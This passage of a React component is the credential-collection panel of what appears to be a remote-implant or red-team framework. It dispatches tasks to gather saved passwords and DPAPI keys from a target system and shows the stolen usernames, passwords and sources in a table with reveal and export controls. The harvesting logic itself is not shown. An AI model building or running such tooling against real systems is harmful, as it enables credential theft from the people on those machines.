            <option value="dpapi">DPAPI 主密钥</option>
          </select>
          <button className="cred-collect-btn" onClick={handleCollect} disabled={loading}>
            {loading
              ? <><RefreshCw size={14} className="cred-spin" /> 收集...</>
              : <><KeyRound size={14} /> 收集凭据</>}
          </button>
          {results && (
            <button className="cred-export-btn" onClick={handleExportJSON} title="导出 JSON" data-testid="cred-export">
              <Download size={14} />
            </button>
          )}
        </div>
      </div>

      <div className="cred-notice">
        <AlertTriangle size={14} />
        <span>凭据收集操作会读取目标系统上保存的密码和凭据信息。可能触发安全软件告警，请在授权范围内使用。</span>
      </div>

      {phase !== 'idle' && (
        <div className="cred-stage-wrap">
          <div className="cred-stages">
            {['已下发', '执行中', '已完成'].map((label, i) => (
              <span key={label} className={`cred-stage ${stageIndex >= i ? 'cred-stage-on' : ''} ${phase === 'timeout' && i === 1 ? 'cred-stage-warn' : ''}`}>
                {phase === 'done' && i === 2 ? <CheckCircle2 size={12} /> : <Clock size={12} />}
                {label}
              </span>
            ))}
            {phase === 'running' && (
              <span className={`credv2-pause ${pollPaused || !panelVisible ? 'credv2-pause-on' : ''}`} data-testid="cred-poll-state">
                {pollPaused || !panelVisible ? '轮询已暂停（本页不可见）' : '轮询中'}
              </span>
            )}
          </div>
          {(phase === 'running' || phase === 'dispatched') && (
            <div className="cred-progress" title={`${formatSeconds(elapsedMs)} / 等待上限 ${POLL_CAP_SEC} s`}>
              <div className="cred-progress-bar" style={{ width: `${Math.max(2, progressPct)}%` }} />
            </div>
          )}
        </div>
      )}

      {stageText && (
        <div className={`cred-status ${phase === 'timeout' || phase === 'error' ? 'cred-status-warn' : ''}`} data-testid="cred-stage-text">
          {stageText}
          {lastTaskId !== null && phase !== 'done' && (
            <span className="cred-task-id">任务 #{lastTaskId}</span>
          )}
        </div>
      )}

      {serverError && (
        <div className="cred-error cred-error-block">
          <AlertTriangle size={13} />
          <div>
            <div className="cred-error-label">服务端错误原文</div>
            <pre className="cred-error-text">{serverError}</pre>
          </div>
        </div>
      )}

      {rawOutput && (
        <div className="cred-section">
          <h4 className="cred-section-title">原始返回（非分段 JSON）</h4>
          <pre className="cred-error-text">{rawOutput}</pre>
        </div>
      )}

      {results?.notes?.map((n, i) => (
        <div className="cred-note" key={i}><AlertTriangle size={12} />{n}</div>
      ))}

      {results && (
        <>
          {/* ── 统计行：耗时(ms) 与 等待上限(s) 必须分开写、单位不混 ── */}
          <div className="credv2-stats" data-testid="cred-stats">
            <span className="credv2-stat" data-testid="cred-stat-total">
              总条数 <b>{view.totalCount}</b>
            </span>
            <span className="credv2-stat" data-testid="cred-stat-returned">
              已返回 <b>{view.returnedCount}</b>
            </span>
            <span className={`credv2-stat ${view.omittedCount > 0 ? 'credv2-stat-warn' : ''}`} data-testid="cred-stat-omitted">
              已省略 <b>{view.omittedCount}</b>
            </span>
            <span className={`credv2-stat ${view.truncated ? 'credv2-stat-warn' : ''}`} data-testid="cred-stat-truncated">
              截断 <b>{view.truncated ? '是' : '否'}</b>
            </span>
            <span className={`credv2-stat ${view.v20Count > 0 ? 'credv2-stat-warn' : ''}`} data-testid="cred-stat-v20">
              v20 未解密 <b>{view.v20Count}</b>
            </span>
            <span className="credv2-stat" data-testid="cred-stat-duration" title="来自任务结果的 duration_ms（植入端实际收集耗时）">
              <Clock size={12} />本次取值耗时 <b>{formatDurationMs(view.durationMs)}</b>
            </span>
            <span className="credv2-stat credv2-stat-cap" data-testid="cred-stat-poll-cap" title="前端轮询 /tasks 的总等待上限，不是本次耗时；面板隐藏时暂停计时">
              <Clock size={12} />等待上限 <b>{POLL_CAP_SEC} s</b>（前端轮询上限，非耗时）
            </span>
            {typeof view.elevated === 'boolean' && (
              <span className="credv2-stat">
                权限 <b>{view.elevated ? '管理员' : '普通用户'}</b>
              </span>
            )}
            {lastTaskId !== null && (
              <span className="credv2-stat credv2-stat-muted">任务 #{lastTaskId}</span>
            )}
          </div>

          {view.truncated && (
            <div className="credv2-banner credv2-banner-warn">
              <AlertTriangle size={14} />
              <span>
                已省略 {view.omittedCount} 条，完整结果见任务 JSON
                {lastTaskId !== null ? `（任务 #${lastTaskId}）` : ''}；可用右上角导出按钮下载。
              </span>
            </div>
          )}

          {/* ── 分段标签：每段 count/returned ── */}
          <div className="credv2-tabs" role="tablist" aria-label="凭据分段">
            {TAB_ORDER.map((tab) => {
              const meta = tabMeta(tab)
              const selected = activeTab === tab
              return (
                <button
                  key={tab}
                  type="button"
                  role="tab"
                  aria-selected={selected}
                  className={`credv2-tab ${selected ? 'credv2-tab-active' : ''}`}
                  onClick={() => setActiveTab(tab)}
                  data-testid={`cred-tab-${tab}`}
                  title={`${meta.label}：count=${meta.count}，returned=${meta.returned}`}
                >
                  <span className="credv2-tab-label">{meta.label}</span>
                  <span className="credv2-tab-count">{meta.count}/{meta.returned}</span>
                  {meta.v20 > 0 && <span className="credv2-tab-flag credv2-tab-flag-warn">v20</span>}
                  {meta.needsAdmin && <span className="credv2-tab-flag credv2-tab-flag-admin">需管理员</span>}
                  {meta.hasError && !meta.needsAdmin && <span className="credv2-tab-flag credv2-tab-flag-error">错误</span>}
                </button>
              )
            })}
          </div>

          {/* ── 当前分段的醒目提示 ── */}
          {activeTab === 'all' ? (
            SEGMENT_ORDER.map((key) => {
              const hasNotice = !!view.per[key].seg
                && (view.per[key].v20 > 0 || !!view.per[key].seg?.needs_admin || !!view.per[key].seg?.error)
              return hasNotice ? <div key={`notices-${key}`}>{renderSegmentBanners(key, false)}</div> : null
            })
          ) : (
            renderSegmentBanners(activeTab, true)
          )}

          {rows.length > 0 ? (
            <>
              <div className="credv2-table-toolbar">
                <span className="credv2-row-count" data-testid="cred-row-count">
                  当前分段 {rows.length} 行{activeTab === 'all' ? '（全部类别）' : `（${SEGMENT_LABELS[activeTab]}）`}
                </span>
                <div className="credv2-table-actions">
                  <button
                    type="button"
                    className="credv2-btn"
                    onClick={() => {
                      setRevealAll((prev) => !prev)
                      setHiddenRows(new Set())
                    }}
                    data-testid="cred-toggle-all-passwords"
                  >
                    {revealAll ? <><EyeOff size={12} />隐藏全部密码</> : <><Eye size={12} />显示全部密码</>}
                  </button>
                </div>
              </div>

              <div className="credv2-table-wrap" data-testid="cred-table-wrap">
                <table className="credv2-table" data-testid="cred-table">
                  <colgroup>
                    <col style={{ width: '20%' }} />
                    <col style={{ width: '30%' }} />
                    <col style={{ width: '32%' }} />
                    <col style={{ width: '18%' }} />
                  </colgroup>
                  <thead>
                    <tr>
                      <th>用户名</th>
                      <th>密码</th>
                      <th>来源（URL / profile / 文件）</th>
                      <th>状态</th>
                    </tr>
                  </thead>
                  <tbody>
                    {rows.map((row) => (
                      <tr key={row.id} data-testid={`cred-row-${row.id}`}>
                        <td className="credv2-td" title={row.username || undefined}>
                          <span className="credv2-ellipsis">{row.username || '—'}</span>
                        </td>
                        <td className="credv2-td">{renderPasswordCell(row)}</td>
                        <td className="credv2-td" title={row.source || undefined}>
                          <span className="credv2-ellipsis" title={row.source || undefined}>{row.source || '—'}</span>
                        </td>
                        <td className="credv2-td">
                          <span className="credv2-badges">
                            {activeTab === 'all' && (
                              <span className="credv2-badge credv2-badge-muted" title={row.segmentLabel}>
                                {SEGMENT_SHORT[row.segment]}
                              </span>
                            )}
                            {row.badges.map((badge, i) => (
                              <span
                                key={`${row.id}-b${i}`}
                                className={`credv2-badge credv2-badge-${badge.tone}`}
                                title={badge.title}
                              >
                                {badge.text}
                              </span>
                            ))}
                            {row.badges.length === 0 && activeTab !== 'all' && (
                              <span className="credv2-badge credv2-badge-muted">正常</span>
                            )}
                          </span>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </>
          ) : (
            <div className="credv2-empty" data-testid={`cred-empty-${activeTab}`}>
              <AlertTriangle size={18} />
              <div className="credv2-empty-title">
                该类别未取到条目（原因：{emptyReasonFor(activeTab)}）
              </div>
              {activeSegment?.seg?.count ? (
                <div className="credv2-empty-sub">
                  服务端声明 count={activeSegment.seg.count}、returned={activeSegment.returned}；
                  若这里的数字不为 0，请查看任务 JSON 确认是否被分段上限省略。
                </div>
              ) : null}
            </div>
          )}
        </>
      )}

      {results && view.totalCount === 0 && view.allRows.length === 0 && !serverError && phase === 'done' && (
        <div className="credv2-empty">
          <AlertTriangle size={18} />
          <div className="credv2-empty-title">
            未找到任何凭据信息（原因：各分段均为 0 条；可切到具体分段查看采集器返回的错误）。
          </div>
        </div>
      )}
    </div>
  )
}
